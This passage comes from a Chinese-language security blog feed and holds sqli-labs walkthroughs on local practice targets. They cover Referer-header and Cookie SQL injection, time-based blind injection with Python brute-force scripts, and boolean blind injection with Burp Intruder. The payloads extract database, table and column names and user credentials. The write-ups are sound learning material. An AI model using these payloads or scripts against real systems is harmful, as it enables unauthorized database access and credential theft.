class=\"line\"></span><br><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27;)&quot; --+</span><br><span class=\"line\">ou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot; --+&#x27;, &#x27;127.0.0.1&#x27;)&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p><strong>依旧不行，我们回过头来看看第一个报错</strong></p>\n<p><code>near &#39;&quot;&#39;, &#39;127.0.0.1&#39;)&#39; at line 1</code></p>\n<p><strong>去掉最外层的两个单引号：</strong></p>\n<p><code>&quot;&#39;, &#39;127.0.0.1&#39;)</code></p>\n<p>一个数据库语句出现了逗号，说明极有可能是union引导的<code>select 1,2</code>这样的查询，或者是<strong>insert、update</strong>这样的语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">insert into 表名 values(a,b,c)</span><br><span class=\"line\">例子：insert into student_info values(5,&#x27;liutao&#x27;,&#x27;12&#x27;); </span><br><span class=\"line\"></span><br><span class=\"line\">UPDATE student_info SET num=4,name=&#x27;liutao&#x27;,age=&#x27;15&#x27;</span><br></pre></td></tr></table></figure>\n<p>因为除了逗号之外还出现了括号，<strong>update和select一般是没有括号的</strong>，因此锁定在<strong>insert into</strong>上。</p>\n<p>那么，我们目前注入的位置是很大概率在<code>&#39;liutao&#39;, &#39;12&#39;</code>这个逗号所在位置附近。</p>\n<p>因此，<strong>由于注入内容后面跟着一个单引号</strong>，我们尝试<code>and</code>结合<code>单引号</code>注入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">insert into student_info values(5,&#x27;liutao&#x27; and &#x27;&#x27;,&#x27;12&#x27;); </span><br></pre></td></tr></table></figure>\n<p>OK，替换成我们的语句就是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27; and &#x27;</span><br></pre></td></tr></table></figure>\n<p>成功不报错</p>\n<p><img src=\"image-20221002000657623.png\" alt=\"image-20221002000657623\"></p>\n<h2 id=\"优先尝试报错注入\"><a href=\"#优先尝试报错注入\" class=\"headerlink\" title=\"优先尝试报错注入\"></a>优先尝试报错注入</h2><p><strong>由于是使用and+单引号注入</strong>，可插入非法查询语句的位置和平常不太一样，因此我们尝试再加入<code>一个and来构造一个报错条件</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27; and extractvalue(1,concat(0x7e,version(),0x7e)) and &#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002001021204.png\" alt=\"image-20221002001021204\"></p>\n<h2 id=\"爆数据库名\"><a href=\"#爆数据库名\" class=\"headerlink\" title=\"爆数据库名\"></a>爆数据库名</h2><p>接下来就是替换version()了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27; and extractvalue(1,concat(0x7e,database(),0x7e)) and &#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002001434314.png\" alt=\"image-20221002001434314\"></p>\n<h2 id=\"爆表名\"><a href=\"#爆表名\" class=\"headerlink\" title=\"爆表名\"></a>爆表名</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) and &#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002001605648.png\" alt=\"image-20221002001605648\"></p>\n<h2 id=\"爆列名\"><a href=\"#爆列名\" class=\"headerlink\" title=\"爆列名\"></a>爆列名</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),0x7e)) and &#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002001714543.png\" alt=\"image-20221002001714543\"></p>\n<p>至此，HTTP-Referer注入演示完毕。</p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/Cookie%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/Cookie%E6%B3%A8%E5%85%A5/",
            "title": "Cookie注入",
            "date_published": "2022-10-01T14:13:13.000Z",
            "content_html": "<h1 id=\"SQL注入之Cookie注入\"><a href=\"#SQL注入之Cookie注入\" class=\"headerlink\" title=\"SQL注入之Cookie注入\"></a>SQL注入之Cookie注入</h1><p>本篇讲解Cookie注入。</p>\n<p>老样子，Less-20，直接送入repeater</p>\n<p><img src=\"image-20221001224019603.png\" alt=\"image-20221001224019603\"></p>\n<h2 id=\"尝试报错\"><a href=\"#尝试报错\" class=\"headerlink\" title=\"尝试报错\"></a>尝试报错</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cookie: uname=admin&#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001224212276.png\" alt=\"image-20221001224212276\"></p>\n<h2 id=\"尝试不报错\"><a href=\"#尝试不报错\" class=\"headerlink\" title=\"尝试不报错\"></a>尝试不报错</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cookie: uname=admin&#x27; %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001224125843.png\" alt=\"image-20221001224125843\"></p>\n<h2 id=\"尝试order-by-注入\"><a href=\"#尝试order-by-注入\" class=\"headerlink\" title=\"尝试order by 注入\"></a>尝试order by 注入</h2><p>order by n asc/desc是指定列号n进行排序</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cookie: uname=admin&#x27; order by 4 %23</span><br><span class=\"line\">报错：YOUR COOKIE : uname = admin&#x27; order by 4 # and expires</span><br><span class=\"line\"></span><br><span class=\"line\">Cookie: uname=admin&#x27; order by 3 %23</span><br><span class=\"line\">成功不报错</span><br></pre></td></tr></table></figure>\n<p>因此确定<code>列数为3</code></p>\n<p><code>注意</code>：在order by后面的不会根据计算的结果来排序，所以可以直接用来报错注入。</p>\n<p>尝试下直接报错注入是否可行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cookie: uname=admin&#x27; order by extractvalue(1,concat(0x7e,version(),0x7e))%23</span><br><span class=\"line\">报错：YOUR COOKIE : uname = admin&#x27; order by extractvalue(1,concat(0x7e,version(),0x7e))#</span><br></pre></td></tr></table></figure>\n<p>报错，看来这种直接报错注入的方式是不可行的。</p>\n<h2 id=\"Cookie注入查询到数据库名\"><a href=\"#Cookie注入查询到数据库名\" class=\"headerlink\" title=\"Cookie注入查询到数据库名\"></a>Cookie注入查询到数据库名</h2><p>cookie注入就是基于union查询的基础上，在Cookie中进行注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=admin&#x27; and 0 union select 1, database(), 3 %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001225129636.png\" alt=\"image-20221001225129636\"></p>\n<h2 id=\"查询到表名\"><a href=\"#查询到表名\" class=\"headerlink\" title=\"查询到表名\"></a>查询到表名</h2><p>进而通过替换database()处，变成<code>双注入</code>，再查询出表名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=admin&#x27; and 0 union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=database()), 3 %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001225840363.png\" alt=\"image-20221001225840363\"></p>\n<h2 id=\"查询到列名\"><a href=\"#查询到列名\" class=\"headerlink\" title=\"查询到列名\"></a>查询到列名</h2><p>一样的套路</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=admin&#x27; and 0 union select 1, (select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;), 3 %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001230122246.png\" alt=\"image-20221001230122246\"></p>\n<h2 id=\"查询到账号密码\"><a href=\"#查询到账号密码\" class=\"headerlink\" title=\"查询到账号密码\"></a>查询到账号密码</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=admin&#x27; and 0 union select 1, (select group_concat(concat_ws(0x7e,username,password)) from security.users), 3 %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001230318424.png\" alt=\"image-20221001230318424\"></p>\n<h2 id=\"思考\"><a href=\"#思考\" class=\"headerlink\" title=\"思考\"></a>思考</h2><p>通过Cookie注入，我们要思考：<code>HTTP请求包中，是否还有其他的字段（Cookie外）也有可能和数据库产生交互呢？</code></p>\n<p>答：有的，<code>HTTP-Referer</code>就存在。</p>\n<p>至此，Cookie注入演示完毕。</p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/",
            "url": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/",
            "title": "时间盲注",
            "date_published": "2022-10-01T12:10:06.000Z",
            "content_html": "<h1 id=\"SQL注入之时间盲注\"><a href=\"#SQL注入之时间盲注\" class=\"headerlink\" title=\"SQL注入之时间盲注\"></a>SQL注入之时间盲注</h1><p>在上一篇博客中，了解了<strong>布尔盲注</strong>，其实<strong>布尔盲注</strong>和<strong>时间盲注</strong>大致相同，注入原理是一致的，区别就是一个<strong>还是有回显的</strong>，一个<strong>彻底没有回显</strong>，通过构造语句，通过页面响应的时长，来判断信息，这就是时间盲注。</p>\n<p>先来学习一下<strong>时间盲注</strong>所需要的函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sleep()//延迟函数</span><br><span class=\"line\">if(condition,true,false)//若条件为真 返回true，若条件为假 返回false</span><br><span class=\"line\">substring(&quot;string&quot;,strart,length)</span><br></pre></td></tr></table></figure>\n<p>主要的也就是这几个了，下面就通过<strong>sqli-labs</strong>第十关来练习时间盲注</p>\n<h2 id=\"尝试注入报错\"><a href=\"#尝试注入报错\" class=\"headerlink\" title=\"尝试注入报错\"></a>尝试注入报错</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-10/?id=1&#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001170904491.png\" alt=\"image-20221001170904491\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-10/?id=1&#x27;&quot;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001170453268.png\" alt=\"image-20221001170453268\"></p>\n<p>构造<code>and 1</code>条件，然后使用if条件语句包含时间盲注。</p>\n<p>如果database()的长度大于5，那么返回1，否则延迟10s</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id=1&quot; and if(length(database())&gt;5,1,sleep(10))--+</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001175533536.png\" alt=\"image-20221001175533536\"></p>\n<p>将长度改为和10进行比较</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-10/?id=1&quot; and if(length(database())&gt;10,1,sleep(10))--+</span><br></pre></td></tr></table></figure>\n<p>开始转圈等待10s了，所以存在时间盲注条件。</p>\n<p><img src=\"image-20221001184209796.png\" alt=\"image-20221001184209796\"></p>\n<p>手工注入太浪费时间，开始研究脚本爆破</p>\n<h2 id=\"尝试脚本爆破\"><a href=\"#尝试脚本爆破\" class=\"headerlink\" title=\"尝试脚本爆破\"></a>尝试脚本爆破</h2><p><strong>时间盲注只需要这两个模块，一个获取时间，一个请求网址</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import time</span><br><span class=\"line\">import requests</span><br></pre></td></tr></table></figure>\n<p><strong>全局就定义了1个参数，数据库可能采用的字符</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">words = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_-&#123;&#125;, &quot;</span><br></pre></td></tr></table></figure>\n<p><strong>判断database()长度的函数，也就是数据库名的长度，可以减少判断数据库名的时间，可以修改length()内部的参数来判断其他变量的长度，减少跑出名字的时间</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">words = <span class=\"string\">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_-&#123;&#125;, &quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">target_length</span>():</span><br><span class=\"line\">    length = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">15</span>):</span><br><span class=\"line\">        url = <span class=\"string\">&quot;http://127.0.0.1/sqli/Less-10/?id=1\\&quot; and if(length(database())=%d,sleep(2),0)&quot;</span> %(i)</span><br><span class=\"line\">        url = url+<span class=\"string\">&#x27;%23&#x27;</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(url)  <span class=\"comment\">#可输出测试是否写错</span></span><br><span class=\"line\">        start_time = time.time()<span class=\"comment\">#请求开始的时间</span></span><br><span class=\"line\">        requests.get(url)</span><br><span class=\"line\">        end_time = time.time()<span class=\"comment\">#请求结束的时间</span></span><br><span class=\"line\">        t = end_time - start_time<span class=\"comment\">#时间差</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> t &gt;= <span class=\"number\">1</span>:</span><br><span class=\"line\">            length = i</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;target_lenght is: &quot;</span>, length)</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">target_name</span>():</span><br><span class=\"line\">    name = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">10</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> words:</span><br><span class=\"line\">            <span class=\"comment\">#url = &quot;http://127.0.0.1/sqli/Less-10/?id=1\\&quot; and if(ascii(substr(select group_concat(table_name) from information_schema.tables where table_schema=database(),%d,1)=ord(&#x27;%s&#x27;)),sleep(1),0) --+&quot; %(i,j)</span></span><br><span class=\"line\">            url = <span class=\"string\">&quot;http://127.0.0.1/sqli/Less-10/?id=1\\&quot; and if(ascii(substr(database(),%d,1))=ord(&#x27;%s&#x27;),sleep(2),0) --+&quot;</span> %(i,j)</span><br><span class=\"line\">            url = url+<span class=\"string\">&#x27;%23&#x27;</span></span><br><span class=\"line\">            <span class=\"built_in\">print</span>(url)  <span class=\"comment\">#可输出测试是否写错</span></span><br><span class=\"line\">            start_time = time.time()<span class=\"comment\">#请求开始的时间</span></span><br><span class=\"line\">            requests.get(url)</span><br><span class=\"line\">            end_time = time.time()<span class=\"comment\">#请求结束的时间</span></span><br><span class=\"line\">            t = end_time - start_time<span class=\"comment\">#时间差</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> t &gt;= <span class=\"number\">1</span>:</span><br><span class=\"line\">                name += j</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;target_name is: &quot;</span>+ name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#target_length()</span></span><br><span class=\"line\">target_name()</span><br></pre></td></tr></table></figure>\n<p>可以得出，长度为8，库名为<strong>security</strong></p>\n<p><img src=\"image-20221001200020143.png\" alt=\"image-20221001200020143\"></p>\n<p>接下来就改改url就可以爆破其他值了。</p>\n<p>通用<code>GET类型时间盲注</code>题目脚本小练习</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">key = <span class=\"string\">&#x27;Username: kevin&#x27;</span></span><br><span class=\"line\">words = <span class=\"string\">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-.&#123;&#125;&#x27;</span></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://127.0.0.1/SQLC/sql-2.php/SQl-4.php?id=1&#x27;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">target_length</span>():</span><br><span class=\"line\">\tlength = <span class=\"number\">0</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">15</span>):</span><br><span class=\"line\">\t\tpayload = <span class=\"string\">&quot; and if(length(database())=&#123;&#125;,sleep(2),0) %23&quot;</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(url + payload)  <span class=\"comment\">#可输出测试是否写错</span></span><br><span class=\"line\">\t\tstart = time.time()</span><br><span class=\"line\">\t\trequests.get(url + payload)</span><br><span class=\"line\">\t\tend = time.time()</span><br><span class=\"line\">\t\tt = end - start</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> t &gt;=<span class=\"number\">1</span> :</span><br><span class=\"line\">\t\t\tlength = i</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;target_length is:&quot;</span>, <span class=\"built_in\">str</span>(length))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">target_name</span>(<span class=\"params\">length</span>):</span><br><span class=\"line\">\tname = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,length+<span class=\"number\">1</span>):</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> words:</span><br><span class=\"line\">\t\t\tpayload = <span class=\"string\">&quot; and if(ascii(mid(database(),&#123;&#125;,1))=ord(&#x27;&#123;&#125;&#x27;),sleep(2),0) %23&quot;</span>.<span class=\"built_in\">format</span>(i,j)</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">print</span>(url + payload)</span><br><span class=\"line\">\t\t\tstart = time.time()</span><br><span class=\"line\">\t\t\trequests.get(url + payload)</span><br><span class=\"line\">\t\t\tend = time.time()</span><br><span class=\"line\">\t\t\tt = end - start</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> t &gt;=<span class=\"number\">1</span> :</span><br><span class=\"line\">\t\t\t\tname += j</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;target_name is:&quot;</span>, name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#target_length() #结果为target_length is: 9</span></span><br><span class=\"line\">target_name(<span class=\"number\">9</span>) <span class=\"comment\">#参数填入上一步的结果</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"C:\\Users\\JcH4liXh\\AppData\\Roaming\\Typora\\typora-user-images\\image-20221001213601177.png\" alt=\"image-20221001213601177\"></p>\n<p>至此，时间盲注演示完毕。</p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/",
            "url": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/",
            "title": "布尔盲注",
            "date_published": "2022-09-30T17:41:34.000Z",
            "content_html": "<h1 id=\"SQL-注入之布尔盲注\"><a href=\"#SQL-注入之布尔盲注\" class=\"headerlink\" title=\"SQL 注入之布尔盲注\"></a>SQL 注入之布尔盲注</h1><p>本篇使用布尔盲注。</p>\n<p><code>注意</code>：盲注是注入的一种，指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施SQL注入。</p>\n<p><strong>布尔盲注</strong></p>\n<p><strong>原理：</strong><br>注入的时候只会返回<code>True和False</code>，所以布尔盲注就是根据页面显示的是<code>True还是False</code>进行猜测数据库中的信息。</p>\n<p>布尔盲注需要几个函数的辅助，就先来了解一下这几个函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">length()函数可返回字符串的长度</span><br><span class=\"line\">substring()函数可以截取字符串，可指定开始的位置和截取的长度</span><br><span class=\"line\">ord()函数可以返回单个字符的ASCII码</span><br><span class=\"line\">char()函数可将ASCII码转换为对应的字符</span><br></pre></td></tr></table></figure>\n<p>具体的用法可以参考大佬的博客<a href=\"https://www.jianshu.com/p/f0174ea6c69d\">Mysql语法介绍</a>，接下来就通过<strong>sql-labs</strong>练习布尔盲注。</p>\n<p><strong>判断注入点</strong>（也就是闭合符号）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-8/?id=1&#x27;</span><br></pre></td></tr></table></figure>\n<p>发现输入<code>id=1&#39;</code>没有错误回显</p>\n<p><img src=\"image-20221001005755289.png\" alt=\"image-20221001005755289\"></p>\n<p>在<code>id=1&#39;</code>后再加上<strong>注释符号</strong>后又回显正确，所以判定闭合符号为<code>&#39;</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-8/?id=1&#x27; %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001005844512.png\" alt=\"image-20221001005844512\"></p>\n<p><strong>爆数据库长度</strong></p>\n<p>由于我们知道 <code>select uname = &#39;id&#39; and 1 from xxxx</code> 在id有效的情况下，加入<code>and 1</code>不会影响整体判断</p>\n<p>那么，这里的1可以被任何的查询正确的<code>布尔型判断语句</code>返回结果所替代，比如<code>length(database()) =x</code>就可以来代替 1 这个值。</p>\n<p>只有当x等于正确的数据库长度时，才能使<code>and 1 成立</code>，才能使整个查询语句回显正确的内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-8/?id=1&#x27; and length(database())=1 --+</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-8/?id=1&#x27; and length(database())=2 --+</span><br><span class=\"line\">.....</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-8/?id=1&#x27; and length(database())=8 --+</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001010826646.png\" alt=\"image-20221001010826646\"></p>\n<p><img src=\"image-20221001010848025.png\" alt=\"image-20221001010848025\"></p>\n<p>手工注入的话就要一遍一遍的试试，将后面的长度不断增大，最后得出数据库名的长度为<code>8</code></p>\n<p><strong>爆数据库名</strong><br>知道了数据库名的长度，接下来就来爆破数据库名</p>\n<p><strong>以这一句为基础</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-8/?id=1&#x27;and 1 --+</span><br></pre></td></tr></table></figure>\n<p>继续深入构造爆破查询语句：</p>\n<h3 id=\"注入步骤\"><a href=\"#注入步骤\" class=\"headerlink\" title=\"注入步骤\"></a>注入步骤</h3><p>布尔盲注爆破数据库名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-8/?id=1&#x27;and ascii(substr(database(),1,1))=1 --+</span><br></pre></td></tr></table></figure>\n<p>然后交给<strong>BurpSuit</strong>抓包，选择<strong>Send to Intruder</strong></p>\n<h4 id=\"清空变量\"><a href=\"#清空变量\" class=\"headerlink\" title=\"清空变量\"></a>清空变量</h4><p><img src=\"image-20221001011237616.png\" alt=\"image-20221001011237616\"></p>\n<h4 id=\"设置爆破变量\"><a href=\"#设置爆破变量\" class=\"headerlink\" title=\"设置爆破变量\"></a>设置爆破变量</h4><p>首先我们确定好</p>\n<p> ascii(substr(database(),<code>1</code>,1))=<code>1</code> —+ 这一句中，我标识出来的两个位置【需要我们使用工具<strong>爆破</strong>】。</p>\n<p>使用Add$ 来为想要爆破的变量添加上变量符号</p>\n<p><img src=\"image-20221001011541978.png\" alt=\"image-20221001011541978\"></p>\n<h4 id=\"选择爆破取值范围\"><a href=\"#选择爆破取值范围\" class=\"headerlink\" title=\"选择爆破取值范围\"></a>选择爆破取值范围</h4><p>第一个位置， ascii(substr(database(),<code>1</code>,1))=1</p>\n<p><img src=\"image-20221001011859324.png\" alt=\"image-20221001011859324\"></p>\n<p>第二个位置， ascii(substr(database(),1,1))=<code>1</code></p>\n<p><img src=\"image-20221001012047075.png\" alt=\"image-20221001012047075\"></p>\n<h4 id=\"开始爆破\"><a href=\"#开始爆破\" class=\"headerlink\" title=\"开始爆破\"></a>开始爆破</h4><p><img src=\"image-20221001012115998.png\" alt=\"image-20221001012115998\"></p>\n<p>由于我们的包总长度<code>根据回显内容不同而发生变化</code>，因此，只有<strong>当取值正确的时候包长度会跟其他错误的情况不一样</strong>，看下图有8个情况和其他次数有不一样的结果。</p>\n<p><img src=\"image-20221001012215106.png\" alt=\"image-20221001012215106\"></p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>payload1(数据库名第n个字符)</th>\n<th>payload2(数据库名第n个字符是什么字符)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>115—&gt;’s’</td>\n</tr>\n<tr>\n<td>2</td>\n<td>101—&gt;’e’</td>\n</tr>\n<tr>\n<td>3</td>\n<td>99  —&gt;’c’</td>\n</tr>\n<tr>\n<td>4</td>\n<td>117—&gt;’u’</td>\n</tr>\n<tr>\n<td>5</td>\n<td>114—&gt;’r’</td>\n</tr>\n<tr>\n<td>6</td>\n<td>105—&gt;’i’</td>\n</tr>\n<tr>\n<td>7</td>\n<td>116—&gt;’t’</td>\n</tr>\n<tr>\n<td>8</td>\n<td>121—&gt;’y’</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>综上，数据库名是<code>security</code></p>\n<p>爆破表名，同理</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-8/?id=1&#x27;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=1 --+</span><br></pre></td></tr></table></figure>\n<p>小练习：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#尝试报错</span><br><span class=\"line\">①http://127.0.0.1/SQLC/sql-3.php/?id=1</span><br><span class=\"line\">②http://127.0.0.1/SQLC/sql-3.php/?id=1&#x27;</span><br><span class=\"line\">传入的值:id=1</span><br><span class=\"line\">SELECT * FROM users WHERE id=(1) LIMIT 0,1</span><br><span class=\"line\">Username: kevin</span><br><span class=\"line\">Password: Kevin</span><br><span class=\"line\"></span><br><span class=\"line\">id=1&#x27;查询失败</span><br><span class=\"line\"></span><br><span class=\"line\">#闭合符号，尝试不报错</span><br><span class=\"line\">http://127.0.0.1/SQLC/sql-3.php/?id=1) %23</span><br><span class=\"line\">传入的值:id=1) #</span><br><span class=\"line\">SELECT * FROM users WHERE id=(1) #) LIMIT 0,1</span><br><span class=\"line\">Username: kevin</span><br><span class=\"line\">Password: Kevin</span><br><span class=\"line\"></span><br><span class=\"line\">#布尔盲注</span><br><span class=\"line\">#1.构造布尔值</span><br><span class=\"line\">http://127.0.0.1/SQLC/sql-3.php/?id=1) and 1 %23</span><br><span class=\"line\">Username: kevin</span><br><span class=\"line\">Password: Kevin</span><br><span class=\"line\"></span><br><span class=\"line\">#2.Burp爆破数据库长度</span><br><span class=\"line\">http://127.0.0.1/SQLC/sql-3.php/?id=1) and length(database())=9 %23</span><br><span class=\"line\"></span><br><span class=\"line\">#3.Burp爆破数据库名字</span><br><span class=\"line\">http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr(database(),1,1))=20) %23</span><br><span class=\"line\">1-99</span><br><span class=\"line\">2-104</span><br><span class=\"line\">3-97</span><br><span class=\"line\">4-108</span><br><span class=\"line\">5-108</span><br><span class=\"line\">6-101</span><br><span class=\"line\">7-110</span><br><span class=\"line\">8-103</span><br><span class=\"line\">9-101</span><br><span 